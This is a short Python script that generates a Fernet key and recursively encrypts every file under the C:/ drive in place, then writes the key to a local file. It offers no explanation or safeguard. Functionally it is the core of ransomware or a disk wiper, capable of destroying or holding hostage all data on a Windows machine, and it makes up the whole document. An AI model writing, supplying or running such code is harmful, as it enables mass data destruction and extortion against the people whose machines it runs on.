import os
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        content = file.read()
    fernet=Fernet(key)
    encrypt_content = fernet.encrypt(content)
    with open(file_path,'wb') as file:
        file.write(encrypt_content)
def encrypt_files_in_folders(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
key = Fernet.generate_key()
folder_path = "C:/"
encrypt_files_in_folders(folder_path,key)
with open('key.key', 'wb') as key_file:
    key_file.write(key)